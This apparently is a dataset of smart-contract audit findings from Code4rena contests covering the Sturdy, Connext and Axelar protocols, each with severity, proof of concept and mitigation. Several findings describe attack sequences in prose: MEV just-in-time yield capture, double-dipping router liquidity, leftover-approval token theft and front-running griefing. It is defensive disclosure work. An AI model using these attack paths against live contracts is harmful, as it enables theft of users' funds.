The first one is to let users determine the maximum slippage they're willing to take.
The protocol front-end should set the recommended value for them.

```solidity
  function withdrawCollateral(
    address _asset,
    uint256 _amount,
    address _to,
    uint256 _minReceiveAmount
  ) external virtual {
      // ...
    require(withdrawAmount >= _minReceiveAmount, Errors.VT_WITHDRAW_AMOUNT_MISMATCH);
  }
```

The second one is have a slippage control parameters that's set by the operator.

```solidity
    // Exchange stETH -> ETH via Curve
    uint256 receivedETHAmount = CurveswapAdapter.swapExactTokensForTokens(
      _addressesProvider,
      _addressesProvider.getAddress('STETH_ETH_POOL'),
      LIDO,
      ETH,
      yieldStETH,
      maxSlippage
    );
```

```solidity
    function setMaxSlippage(uint256 _slippage) external onlyOperator {
        maxSlippage = _slippage;

        //@audit This action usually emit an event.
        emit SetMaxSlippage(msg.sender, slippage);
    }
```

These are two common ways to deal with this issue. I prefer the first one.<br>
The market may corrupt really fast before the operator takes action.<br>
It's nothing fun watching the number go down while having no option.<br>







***"
125.md,The check for value transfer success is made after the return statement in `_withdrawFromYieldPool` of `LidoVault`,high,"*Submitted by pedroais, also found by 0x52, 0xliumin, cccz, CertoraInc, fatherOfBlocks, GimelSec, hake, hickuphh3, hyh, IllIllI, isamjay, mtz, oyc_109, p4st13r4, peritoflores, rotcivegaf, sorrynotsorry, StErMi, tabish, WatchPug, z3s, 0x4non, 0xf15ers, berndartmueller, dipp, Dravee, MaratCerby, saian, simon135, sseefried, and TerrierLover*

Users can lose their funds

### Proof of Concept

[LidoVault.sol#L142](https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/LidoVault.sol#L142)<br>

The code checks transaction success after returning the transfer value and finishing execution. If the call fails the transaction won't revert since  require(sent, Errors.VT_COLLATERAL_WITHDRAW_INVALID); won't execute.

Users will have withdrawn without getting their funds back.

### Recommended Mitigation Steps

Return the function after the success check







***"
125.md,Possible lost msg.value,medium,"[GeneralVault.sol#L75-L89](https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L75-L89)<br>
[LidoVault.sol#L79-L104](https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/LidoVault.sol#L79-L104)<br>
[ConvexCurveLPVault.sol#L131-L149](https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L131-L149)<br>

Possible lost value in `depositCollateral` function call

### Proof of Concept

In call `depositCollateral` can will send value and the asset can be an ERC20(!= address(0)), if `LidoVault` and `ConvexCurveLPVault` contract receive this call the fouds will lost.<br>
Also in **LidoVault, L88**, if send as asset ETH(== address(0)) and send more value than `_amount`(msg.value > \_amount), the exedent will lost.

### Recommended Mitigation Steps

In **GeneralVault**, `depositCollateral` function:

*   Check if the `msg.value` is zero when the `_asset` is ERC20(!= address(0))
*   Check if the `msg.value` is equeal to `_amount` when the `_asset` ETH(== address(0))

```solidity
function depositCollateral(address _asset, uint256 _amount) external payable virtual {
  if (_asset != address(0)) { // asset = ERC20
    require(msg.value == 0, <AN ERROR FROM Errors LIBRARY>);
  } else { // asset = ETH
    require(msg.value == _amount, <AN ERROR FROM Errors LIBRARY>);
  }

  // Deposit asset to vault and receive stAsset
  // Ex: if user deposit 100ETH, this will deposit 100ETH to Lido and receive 100stETH TODO No Lido
  (address _stAsset, uint256 _stAssetAmount) = _depositToYieldPool(_asset, _amount);

  // Deposit stAsset to lendingPool, then user will get aToken of stAsset
  ILendingPool(_addressesProvider.getLendingPool()).deposit(
    _stAsset,
    _stAssetAmount,
    msg.sender,
    0
  );

  emit DepositCollateral(_asset, msg.sender, _amount);
}
```

Also can remove the `require(msg.value > 0, Errors.VT_COLLATERAL_DEPOSIT_REQUIRE_ETH);` in **LidoVault, L88**






***"
125.md,`UNISWAP_FEE` is hardcoded which will lead to significant losses compared to optimal routing,medium,"In [`YieldManager`](https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L48), `UNISWAP_FEE` is hardcoded, which reduce significantly the possibilities and will lead to non optimal routes. In particular, all swaps using ETH path will use the wrong pool as it will use the ETH / USDC 1% one due to this [line](https://github.com/sturdyfi/code4rena-may-2022/blob/d53f4f5f0b7b33a66e0081294be6117f6d6e17b4/contracts/protocol/libraries/swap/UniswapAdapter.sol#L50).

### Proof of Concept

For example for CRV / USDC, the optimal route is currently CRV -> ETH and ETH -> USDC, and the pool ETH / USDC with 1% fees is tiny compared to the ones with 0.3 or 0.1%. Therefore using the current implementation would create a significant loss of revenue.

### Recommended Mitigation Steps

Basic mitigation would be to hardcode in advance the best Uniswap paths in a mapping like it’s done for Curve pools, then pass this path already computed to the swapping library. This would allow for complex route and save gas costs as you would avoid computing them in `swapExactTokensForTokens`.

Then, speaking from experience, as `distributeYield` is `onlyAdmin`, you may want to add the possibility to do the swaps through an efficient aggregator like 1Inch or Paraswap, it will be way more optimal.






***"
125.md,`processYield()` and `distributeYield()` may run out of gas and revert due to long list of extra rewards/yields,medium,"Yields will not be able to be distributed to lenders because attempts to do so will revert.

### Proof of Concept

The `processYield()` function loops overall of the extra rewards and transfers them

```solidity
File: smart-contracts/ConvexCurveLPVault.sol   #1

105       uint256 extraRewardsLength = IConvexBaseRewardPool(baseRewardPool).extraRewardsLength();
106       for (uint256 i = 0; i < extraRewardsLength; i++) {
107         address _extraReward = IConvexBaseRewardPool(baseRewardPool).extraRewards(i);
108         address _rewardToken = IRewards(_extraReward).rewardToken();
109         _transferYield(_rewardToken);
110       }
```

[ConvexCurveLPVault.sol#L105-L110](https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L105-L110)<br>

There is no guarantee that the tokens involved will be efficient in their use of gas, and there are no upper bounds on the number of extra rewards:

```solidity
    function extraRewardsLength() external view returns (uint256) {
        return extraRewards.length;
    }


    function addExtraReward(address _reward) external returns(bool){
        require(msg.sender == rewardManager, ""!authorized"");
        require(_reward != address(0),""!reward setting"");


        extraRewards.push(_reward);
        return true;
    }
```

[BaseRewardPool.sol#L105-L115](https://github.com/convex-eth/platform/blob/main/contracts/contracts/BaseRewardPool.sol#L105-L115)<br>

Even if not every extra reward token has a balance, an attacker can sprinkle each one with dust, forcing a transfer by this function

`_getAssetYields()` has a similar issue:

```solidity
File: smart-contracts/YieldManager.sol   #X

129       AssetYield[] memory assetYields = _getAssetYields(exchangedAmount);
130       for (uint256 i = 0; i < assetYields.length; i++) {
131         if (assetYields[i].amount > 0) {
132           uint256 _amount = _convertToStableCoin(assetYields[i].asset, assetYields[i].amount);
133           // 3. deposit Yield to pool for suppliers
134           _depositYield(assetYields[i].asset, _amount);
135         }
136       }
```

[YieldManager.sol#L129-L136](https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L129-L136)<br>

### Recommended Mitigation Steps

Include an offset and length as is done in `YieldManager.distributeYield()`.







***"
125.md,ConvexCurveLPVault's `_transferYield` can become stuck with zero reward transfer,medium,"Now there are no checks for the amounts to be transferred via \_transferYield and \_processTreasury. As reward token list is external and an arbitrary token can end up there, in the case when such token doesn't allow for zero amount transfers, the reward retrieval can become unavailable.

I.e. processYield() can be fully blocked for even an extended period, with some low probability, which cannot be controlled otherwise as pool reward token list is external.

Setting the severity to medium as reward gathering is a base functionality for the system and its availability is affected.

#### Proof of Concept

\_transferYield proceeds with sending the amounts to treasury and yieldManager without checking:

[ConvexCurveLPVault.sol#L74-L82](https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L74-L82)<br>

```solidity
    // transfer to treasury
    if (_vaultFee > 0) {
      uint256 treasuryAmount = _processTreasury(_asset, yieldAmount);
      yieldAmount = yieldAmount.sub(treasuryAmount);
    }

    // transfer to yieldManager
    address yieldManager = _addressesProvider.getAddress('YIELD_MANAGER');
    TransferHelper.safeTransfer(_asset, yieldManager, yieldAmount);
```

[ConvexCurveLPVault.sol#L205-L209](https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L205-L209)<br>

```solidity
  function _processTreasury(address _asset, uint256 _yieldAmount) internal returns (uint256) {
    uint256 treasuryAmount = _yieldAmount.percentMul(_vaultFee);
    IERC20(_asset).safeTransfer(_treasuryAddress, treasuryAmount);
    return treasuryAmount;
  }
```

The incentive token can be arbitrary. Some ERC20 do not allow zero amounts to be sent:

<https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers>

In a situation of such a token added to reward list and zero incentive amount earned the whole processYield call will revert, making reward gathering unavailable until either such token be removed from pool's reward token list or some non-zero reward amount be earned. Both are external processes and aren’t controllable.

### Recommended Mitigation Steps

Consider running the transfers in \_transferYield only when yieldAmount is positive:

```solidity
+	if (yieldAmount > 0) {
	    // transfer to treasury
	    if (_vaultFee > 0) {
	      uint256 treasuryAmount = _processTreasury(_asset, yieldAmount);
	      yieldAmount = yieldAmount.sub(treasuryAmount);
	    }

	    // transfer to yieldManager
	    address yieldManager = _addressesProvider.getAddress('YIELD_MANAGER');
	    TransferHelper.safeTransfer(_asset, yieldManager, yieldAmount);
+  }
```







***"
125.md,Withdrawing ETH collateral with max uint256 amount value reverts transaction,medium,"Withdrawing ETH collateral via the `withdrawCollateral` function using `type(uint256).max` for the `_amount` parameter reverts the transaction due to `_asset` being the zero-address and `IERC20Detailed(_asset).decimals()` not working for native ETH.

#### Proof of Concept

[GeneralVault.sol#L121-L124](https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L121-L124)

```solidity
if (_amount == type(uint256).max) {
    uint256 decimal = IERC20Detailed(_asset).decimals(); // @audit-info does not work for native ETH. Transaction reverts
    _amount = _amountToWithdraw.mul(this.pricePerShare()).div(10**decimal);
}
```

### Recommended mitigation steps

Check `_asset` and use hard coded decimal value (`18`) for native ETH.







***"
125.md,Yield can be unfairly divided because of MEV/Just-in-time stablecoin deposits,medium,"[YieldManager.sol#L129-L134](https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/YieldManager.sol#L129-L134)<br>
[YieldManager.sol#L160-L161](https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/YieldManager.sol#L160-L161)<br>

An attacker can use MEV (via gas auction or Flashbots or control of miners) to cause an unfair division of yield. By providing a very large (relative to the size of all other stablecoin deposits combined) stablecoin deposit Just-in-Time before an admin's call to [distributeYield](https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/YieldManager.sol#L118) the stablecoin deposited by the attacker will receive a very large amount of the yield and the attacker can immediately withdraw their deposit after yield is distributed. We assume this allows an attacker to get a lot of the yield reward even though they haven't provided any deposit that has been borrowed. However, the exact mechanism for how yield is distributed to lenders of a particular stablecoin is in LendingPool.sol, which is out of scope. However it is implied in [the documentation of this repo](https://github.com/code-423n4/2022-05-sturdy/blob/main/README.md?plain=1#L52) that it is based on the balance of that asset the lender has provided. We have confirmed that [in LendingPool.sol the yield is distributed based on the proportion of the asset provided](https://github.com/sturdyfi/code4rena-may-2022/blob/d53f4f5f0b7b33a66e0081294be6117f6d6e17b4/contracts/protocol/lendingpool/LendingPool.sol#L182). However, even ignoring this, MEV can still be used to unfairly hurt lenders of other stablecoins.

### Proof of Concept

1.  An attacker watches the mempool for calls to [distributeYield](https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/YieldManager.sol#L118) by the admin.
2.  The attacker orders the block's transactions (most easily using a flashbots bundle) in the following order:<br>
    i. Attacker deposits stablecoins to lend (ideally the stablecoin will be the one with the least volume).<br>
    ii. admin's call to distributeYield happens.<br>
    iii. Attacker withdraws their deposit.<br>

The attacker has thus made the asset they deposited (and thus themselves) receive much of the yield even though they provide no value to Sturdy since none of their deposit is ever borrowed so the never do anything to earn yield for sturdy.
This attack can be done by a whale or by borrowing (even from sturdy) assets and converting them to a stablecoins accepted by sturdy before i. and returning them after iii. This will essentially be cost free for the attacker, none of their capital will ever be tied up by borrowers.

### Recommended Mitigation Steps

The simplest way to mitigate this is for the admin to use flashbots or some other means of submitting the distributeYield call that skips the mempool. This is only a partial mitigation since attackers can still withdraw right after yield is distributed and get lucky by depositing soon before the distribution thus still capture more yield than they should have.<br>
A better mitigation could use something like snapshotting who has deposited since the last yield distribution and only give these depositers yield based on the size of their deposits the next time yield is distributed.





***"
19.md,Anyone can arbitrarily add router liquidity,high,"The `addLiquidity()` function takes a router address parameter, whose liquidity is increased (instead of assuming that `router` == `msg.sender` like is done on `removeLiquidity()`) on this contract/chain, by transferring the fund amount from router address to this contract if `assetID` != 0 (i.e. ERC20 tokens). However, anyone can call this function on the router’s behalf. For `assetID` == 0, the Ether transfer via `msg.value` comes from `msg.sender` and hence is assumed to be the router itself.

The impact is that this will allow anyone to call this function and arbitrarily move ERC20 tokens from router address to this contract, assuming router has given max approval to this contract and has `assetID` amount available for transfer. While the router can always remove the liquidity if it doesn’t want to maintain that level of liquidity, this lack of access control or flexibility for a relayer to add liquidity on router’s behalf, may unnecessarily (and without authorization) increase the router’s exposure to protocol risk to more than it desires. See `TransactionManager.sol` [#L88-L98](https://github.com/code-423n4/2021-07-connext/blob/8e1a7ea396d508ed2ebeba4d1898a748255a48d2/contracts/TransactionManager.sol#L88-L98). See also, use of `msg.sender` in `removeLiquidity` ([#L88-L98](https://github.com/code-423n4/2021-07-connext/blob/8e1a7ea396d508ed2ebeba4d1898a748255a48d2/contracts/TransactionManager.sol#L88-L98)).

Recommend considering the use of `msg.sender` in `addLiquidity()` or evaluate this risk otherwise."
19.md,`activeTransactionBlocks` are vulnerable to DDoS attacks,high,"There is a potential issue in function `removeUserActiveBlocks` and the for loop inside it. I assume you are aware of block gas limits (they may be less relevant on other chains but still needs to be accounted for), so as there is no limit for `activeTransactionBlocks`, it may grow so large that the for loop may never finish. You should consider introducing an upper limit for `activeTransactionBlocks`. Also, a malicious actor may block any account (DDOS) by just calling `prepare` again and again with 0 amount acting as a router. This will push `activeTransactionBlocks` to the specified user until it is no longer possible to remove them from the array.

This is also a gas issue, as function `removeUserActiveBlocks` iterating and assigning large dynamic arrays is very gas-consuming. Consider optimizing the algorithm, e.g. finding the first occurrence, then swap it with the last item, pop the array, and break. Or maybe even using an [`EnumerableMap`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/structs/EnumerableMap.sol), so you can find and remove elements in `O(1)`.

The best solution depends on what the usual number of `activeTransactionBlocks` is. If it is expected to be low (e.g. less than 5), then the current approach will work. But with larger arrays, I expect `EnumerableMap` would be more efficient.

Because an upper limit will not fully mitigate this issue, as a malicious actor can still DDOS the user by pushing useless txs until this limit is reached and a valid router may not be able to submit new txs. And, because you need to improve both the security _and_ performance of `removeUserActiveBlocks`; `EnumerableMap` may be a go-to solution."
19.md,Router liquidity on receiving chain can be double-dipped by the user,high,"During `fulfill()` on the receiving chain, if the user has set up an external contract at `txData.callTo`, the catch blocks for both `IFulfillHelper.addFunds()` and `IFulfillHelper.excute()` perform `transferAsset` to the predetermined fallback address `txData.receivingAddress`.

If `addFunds()` has reverted earlier, `toSend` amount would already have been transferred to the `receivingAddress`. If `execute()` also fails, it is again transferred.

**Scenario:** User sets up receiver chain `txData.callTo` contract such that both `addFunds()` and `execute()` calls revert. That will let him get twice the `toSend` amount credited to the `receivingAddress`. So effectively, Alice locks 100 `tokenAs` on chain A, and can get 200 `tokenAs` (or twice the amount of any token she is supposed to get on chain B from the router), minus relayer fee, on chain B. Router liquidity is double-dipped by Alice and router loses funds. See `TransactionManager.sol` [L395-L409](https://github.com/code-423n4/2021-07-connext/blob/8e1a7ea396d508ed2ebeba4d1898a748255a48d2/contracts/TransactionManager.sol#L395-L409) and [L413-L428](https://github.com/code-423n4/2021-07-connext/blob/8e1a7ea396d508ed2ebeba4d1898a748255a48d2/contracts/TransactionManager.sol#L413-L428).

Recommend that the second catch block for `execute()` should likely not have the `transferAsset()` call. It seems like a copy-and-paste bug unless there is some reason that is outside the specified scope and documentation for this contest."
19.md,Expired transfers will lock user funds on the sending chain,high,"The cancelling relayer is being paid in `receivingAssetId` on the `sendingChain` instead of in `sendingAssetID`. If the user relies on a relayer to cancel transactions, and that `receivingAssetId` asset does not exist on the sending chain (assuming only `sendingAssetID` on the sending chain and `receivingAssetId` on the receiving chain are assured to be valid and present), then the cancel transaction from the relayer will always revert and user’s funds will remain locked on the sending chain.

The impact is that expired transfers can never be cancelled and user funds will be locked forever if user relies on a relayer.

Recommend changing `receivingAssetId` to `sendingAssetId` in `transferAsset()` on `TransactionManager.sol` [L514](https://github.com/code-423n4/2021-07-connext/blob/8e1a7ea396d508ed2ebeba4d1898a748255a48d2/contracts/TransactionManager.sol#L510-L517)."
19.md,`Approval` is not reset if the call to `IFulfillHelper` fails,high,"The function `fulfill` first approves the `callTo` to transfer an amount of `toSend` tokens and tries to call `IFulfillHelper`, but if the call fails, it transfers these assets directly. However, in such case the approval is not reset, so a malicous `callTo` can pull these tokens later:
```solidity
// First, approve the funds to the helper if needed
    if (!LibAsset.isEther(txData.receivingAssetId) && toSend > 0) {
      require(LibERC20.approve(txData.receivingAssetId, txData.callTo, toSend), ""fulfill: APPROVAL_FAILED"");
    }

    // Next, call `addFunds` on the helper. Helpers should internally
    // track funds to make sure no one user is able to take all funds
    // for tx
    if (toSend > 0) {
      try
        IFulfillHelper(txData.callTo).addFunds{ value: LibAsset.isEther(txData.receivingAssetId) ? toSend : 0}(
          txData.user,
          txData.transactionId,
          txData.receivingAssetId,
          toSend
        )
      {} catch {
        // Regardless of error within the callData execution, send funds
        // to the predetermined fallback address
        require(
          LibAsset.transferAsset(txData.receivingAssetId, payable(txData.receivingAddress), toSend),
          ""fulfill: TRANSFER_FAILED""
        );
      }
    }
```
[Tuesday, August 10, 2021](x-fantastical3://show/calendar/2021-08-18)
Recommend that `approval` should be placed inside the try/catch block or `approval` needs to be reset if the call fails."
19.md,Signatures use only tx ID instead of entire digest,medium,"The signature check in `recoverFulfillSignature()` only uses transaction ID (along with the relayer fee) which can be accidentally reused by the user, in which case the older signatures with the older relayer fees can be replayed.  The signature should be on the entire digest `hashInvariantTransactionData(txData)` as indicated in the comment on L306.

The impact is that,  If the user signatures are indeed on the digest as indicated by the comment, the signature/address check in `fulfill()` will fail. If not, they may be accidentally/intentionally replayed with same transaction ID, which also appears to be an outstanding question as indicated by the comment on L12.

`recoverCancelSignature()` similarly uses only tx ID.

Unless there is a good reason not to, it is safer to include `hashInvariantTransactionData(txData)` in signatures so that they cannot be replayed with different txData (but same tx ID) whose `preparedBlockNumber` is > 0.

Recommend evaluating if the signature should contain only tx ID, or the entire digest, and then changing the logic appropriately."
19.md,Malicious router can block cross-chain-transfers,medium,"The agreement between the `user` and the `router` seems to already happen off-chain because all the fields are required for the initial `In variantTransactionData` call already. A router could pretend to take on a user's cross-chain transfer, the user sends their `prepare` transaction, locking up funds on the sending chain.
But then the `router` simply doesn't respond or responds with a `prepare` transaction of `amount=0`.

The user's funds are then locked for the entire expiry time, whereas the router does not have to lock up anything as the amount is 0, even no gas if they simply don't respond. In this way, a router can bid on everything off-chain without a penalty, and take down everyone that accepts the bid.

Recommend that maybe there could be a penalty mechanism for non-responsive routers that agreed off-chain, slashing part of their added liquidity. Could also be that the bid signature already helps with this, but I'm not sure how it works as the off-chain part is not part of the repo."
19.md,Lack of guarded launch approach may be risky,low,"The protocol appears to allow arbitrary assets, amounts and routers/users without an initial time-bounded whitelist of assets/routers/users or upper bounds on amounts. Also, there is no pause/unpause functionality. While this lack of ownership and control makes it completely permission-less, it is a risky design because if there are latent protocol vulnerabilities there is no fallback option. See [Derisking DeFi Guarded Assets](https://medium.com/electric-capital/derisking-defi-guarded-launches-2600ce730e0a).

Recommend considering an initial guarded launch approach to owner-based whitelisting asset types, router/recipient addresses, amount thresholds, and adding a pause/unpause functionality for emergency handling. The design should be able to make this owner configurable, where the owner can renounce ownership at a later point when the protocol operation is sufficiently time-tested and deemed stable/safe."
19.md,Deflationary and fee-on-transfer tokens are not correctly accounted,low,"When a router adds liquidity to the `TransactionManager`, the manager does not correctly handle the received amount if the transferred token is a deflationary or fee-on-transfer token. The actual received amount is less than what is recorded in the `routerBalances` variable. See `TransactionManager.sol` [#L97](https://github.com/code-423n4/2021-07-connext/blob/main/contracts/TransactionManager.sol#L97) and [#L101](https://github.com/code-423n4/2021-07-connext/blob/main/contracts/TransactionManager.sol#L101).


Recommend getting the received token amount by calculating the difference of token balance before and after the transfer, for example:

```solidity
uint256 balanceBefore = getOwnBalance(assetId);
require(LibERC20.transferFrom(assetId, router, address(this), amount, ""addLiquidity: ERC20_TRANSFER_FAILED"");
uint256 receivedAmount = getOwnBalance(assetId) - balanceBefore;

// Update the router balances
routerBalances[router][assetId] += receivedAmount;
```

**- [LayneHaber (Connext) confirmed](https://github.com/code-423n4/2021-07-connext-findings/issues/68)**"
19.md,Missing zero-address checks,low,"Zero-address checks are in general a best-practice. However, `addLiquidity()` and `removeLiquidity()` are missing zero-address checks on router and recipient addresses respectively.

`addLiquidity()` on Eth transfers will update the zero index balance and get logged as such in the event without the amount getting accounted for the correct router.

For ERC20 assets, `token.transfer()` generally implements this check but the Eth transfer using `transferEth()` does not have this check and calls `addr.call(value)`, which will lead to burning in the case of `removeLiquidity()`.

The checks may be more important because `assetID` is 0 for Eth. So a router may accidentally use 0 values for both `assetID` and router/recipient.

There is also a missing zero-address check on `sendingChainFallback` which is relevant for Eth transfers in `cancel()`. The comment on L178 indicates the need for this but the following check on L179 ends up checking `receivingAddress` instead (which is also necessary). See issue page for referenced code.

Recommend adding zero-address checks."
19.md,An attacker can front-run a user’s `prepare()` tx on sending chain to cause DoS by griefing,low,"The `prepare()` function  hashes the invariantData parameter data to check the mapping entry is 0 for that digest as a measure to prevent duplicate `prepare()`s. However, an attacker can abuse this check to front-run a targeted victim's prepare Tx with the same parameters and with some dust amount to prevent the user’s actual prepare Tx from succeeding.

The impact of this the potential griefing attack vector if user address is not `msg.sender`. This is with the assumption that relayers are only relevant on the receiving side where the user may not have the `receivingAssetId` i.e. no reason for `msg.sender` of `prepare()` to be the relayer and not the user.

Recommend adding `msg.sender` == `invariantData.user` check on sending chain side similar to the check for router address on the receiving side."
19.md,`txData.expiry` = `block.timestamp`,low,"The function `fulfill` treats `txData.expiry` = `block.timestamp` as expired tx:
```solidity
// Make sure the expiry has not elapsed
require(txData.expiry > block.timestamp, ""fulfill: EXPIRED"");
```

However, function `cancel` has an inclusive check for the same condition:

```solidity
if (txData.expiry >= block.timestamp) {
// Timeout has not expired and tx may only be cancelled by router
```

Recommend unifying that to make the code coherent. Probably `txData.expiry` = `block.timestamp` should be treated as expired everywhere."
19.md,Unsafe `approve`,low,"Some ERC20 tokens like USDT require resetting the approval to 0 first before being able to reset it to another value. (See [Line 201](https://etherscan.io/address/0xdac17f958d2ee523a2206206994597c13d831ec7#code))
The `LIibERC20.approve` function does not do this - unlike OpenZeppelin's `safeApprove` implementation.

The impact of this, is that repeated USDT cross-chain transfers to the same user on receiving chain = ETH mainnet can fail due to this line not resetting the approval to zero first:

```solidity
require(LibERC20.approve(txData.receivingAssetId, txData.callTo, toSend), ""fulfill: APPROVAL_FAILED"");
```

Recommend that `LiibERC20.approve` should do two `approve` calls, one setting it to `0` first, then the real one.
Check OpenZeppelin's `safeApprove`."
19.md,Router needs to decrease expiry by a significant buffer,low,"The user's `fulfill` signature on the receiving chain is at the same time used by the router as a way to claim their amount on the sending chain.
If the sending chain's `expiry` date has passed, the user can cancel this side of the transfer and claim back their deposit before the router can claim it.
Therefore, the comment that the receiving chain's expiry needs to be decreased is correct:

> // expiry should be decremented to ensure the router has time to complete the sender-side transaction after the user completes the receiver-side transactoin.

However, this is not enforced and if a wrong expiry date is chosen by the router, or the sender congests the network long enough such that the router's `fulfill` transaction does not get through, the router loses their claim and the user gets a free cross-chain transfer.

It would be possible to enforce that `receivingSide.expiry + buffer < sendingSide.expiry` if the original expiry was part of the invariant data.
This would programmatically avoid errors like the ones mentioned. (Assuming all supported chains use the same way to measure time / use UNIX timestamps.)"
19.md,`wrapCall` with weird ERC20 contracts,low,"The function `wrapCall` is not completely safe for all possible ERC20 contracts.

If the `returnData.length` is larger than 1, the ""`abi.decode(returnData, (bool));`"" will fail. Which means the interactions with that ERC20 contract will fail. Although this is unlikely, it is easy to protect against it.

```solidity
// https://github.com/code-423n4/2021-07-connext/blob/main/contracts/lib/LibERC20.sol#L21
function wrapCall(address assetId, bytes memory callData) internal returns (bool) {
    ...
    (bool success, bytes memory returnData) = assetId.call(callData);
    LibUtils.revertIfCallFailed(success, returnData);
    return returnData.length == 0 || abi.decode(returnData, (bool));
}
```

Recommend changing
```solidity
return returnData.length == 0 || abi.decode(returnData, (bool));
```
to:
```solidity
return (returnData.length == 0) || (returnData.length == 1 && abi.decode(returnData, (bool)));
```"
19.md,`MAX_TIMEOUT`,low,"There is a `MIN_TIMEOUT` for the expiry, but I think you should also introduce a `MAX_TIMEOUT` to avoid a scenario when, for example, expiry is set far in the future (e.g. 100 years) and one malicious side does not agree to fulfill or cancel the tx, so the other side then has to wait and leave the funds locked for 100 years or so.

Recommend introducing a reasonable `MAX_TIMEOUT`."
19.md,Unchangeable `chainID` information,low,"The `chainId` information included in the `TransactionManager` is immutable, i.e., it could not change after the contract is deployed. However, if a hard fork happens in the future, the contract would become invalid on one of the forked chains because the chain ID has changed. See `TransactionManager.sol` [L73](https://github.com/code-423n4/2021-07-connext/blob/main/contracts/TransactionManager.sol#L73) and [L79](https://github.com/code-423n4/2021-07-connext/blob/main/contracts/TransactionManager.sol#L79).

Recommend adding a function that allows the admin to set the `chainId` variable if a hard fork happens."
19.md,Relayer txs can be front-runned,low,"There is no relayer address param, only `relayerFee`, so technically anyone can front-run a profitable tx. The scenario might be as follows: A relayer submits a tx. A frontrunner sees it in the mempool and calculates that `relayerFee` is profitable enough (maybe even insta sell the `relayerFee` on AMM for the native asset) so he copies and submits the same tx but with a higher gas price. A frontrunner's tx gets through and a relayer's tx is reverted afterward. So basically a relayer will experience only losses in such a case.

Recommend consider introducing relayer address param or reducing the probability of this scenario in any other meaningful way (e.g. blacklist front-runners)."
109.md,Cross-chain smart contract calls can revert but source chain tokens remain burnt and are not refunded,high,"Smart contract calls often revert. In such cases any ether sent along with the transaction is returned and sometimes the remaining gas (depending on whether an `assert` caused the reversion or not).

For contracts involving ERC20 tokens it is also expected that, should a contract call fail, one's tokens are not lost/transferred elsewhere.

The [callContractWithToken](https://github.com/code-423n4/2022-04-axelar/blob/dee2f2d352e8f20f20027977d511b19bfcca23a3/src/AxelarGateway.sol#L98-L115) function does not appear to take contract call failure on the destination chain into account, even though this could be quite a common occurrence.

Tokens are burned on [line 105](https://github.com/code-423n4/2022-04-axelar/blob/dee2f2d352e8f20f20027977d511b19bfcca23a3/src/AxelarGateway.sol#L105) but there is no mechanism in the code base to return these burned tokens in the case that the contract call fails on the destination chain.

The impact is that users of the Axelar Network can lose funds.

### Proof of Concept

I have put together an executable Proof of Concept in a fork of the repo.
File [DestinationChainContractCallFails.js](https://github.com/sseefried/axelar-2022-04/blob/025078cda30e2da561f80166d8f2274c94a0f814/test/DestinationChainContractCallFails.js#L127) implements a test that attempts to call a token swap function on the destination chain. The [swap](https://github.com/code-423n4/2022-04-axelar/blob/dee2f2d352e8f20f20027977d511b19bfcca23a3/src/test/TokenSwapper.sol#L16-L33) function was provided as part of the competition repo. Given a certain amount of token A it returns twice as much of token B.

In the test I have provided the contract call on the destination chain fails because there is simply not enough of token B in the `TokenSwapper` contract to transfer to the user. This might be rare in practice -- since adequate liquidity would generally be provided by the contract -- but cross-chain contract calls are unlikely to be limited to token swaps only! I specifically chose this example to show that cross-chain contract calls can fail *even in the cases that Axelar have already considered* in their test suite.

In the [unit test](https://github.com/sseefried/axelar-2022-04/blob/025078cda30e2da561f80166d8f2274c94a0f814/test/DestinationChainContractCallFails.js#L129) you will find:

*   Lines of note have been prefixed with `sseefried:`
*   The test is a little strange in that it *succeeds* because it expects a `revert`. This happens on [line 380](https://github.com/sseefried/axelar-2022-04/blob/025078cda30e2da561f80166d8f2274c94a0f814/test/DestinationChainContractCallFails.js#L380)
*   I took the liberty of modifying the `TokenSwapper` contract slightly [here](https://github.com/sseefried/axelar-2022-04/blob/025078cda30e2da561f80166d8f2274c94a0f814/src/test/TokenSwapper.sol#L37), in order to show that the contract call reverts because of a lack of token B.
*   The amount of token A on [line 201](https://github.com/sseefried/axelar-2022-04/blob/025078cda30e2da561f80166d8f2274c94a0f814/test/DestinationChainContractCallFails.js#L201) can be modified to be a smaller value. Doing so, and re-running the test, will result in a *test failure* which means that the contract call did *not* revert i.e. the contract call on the destination chain succeeded. This shows that, before the change, the revert was due to a lack of token B in the `TokenSwapper` contract.
*   [Lines 388-389](https://github.com/sseefried/axelar-2022-04/blob/025078cda30e2da561f80166d8f2274c94a0f814/test/DestinationChainContractCallFails.js#L388-L389) show that, in the case of a revert on the destination chain, the tokens remain burnt on the source chain.

### Recommended Mitigation Steps

When making a credit card purchase it is common for transactions to remain in a ""pending"" state until eventually finalised. Often one's *available* bank balance will decrease the moment the purchase has been approved. Then one of
two things happens:

*   the transaction is finalised and the balance becomes the same as the available balance
*   the transaction fails and the amount is refunded

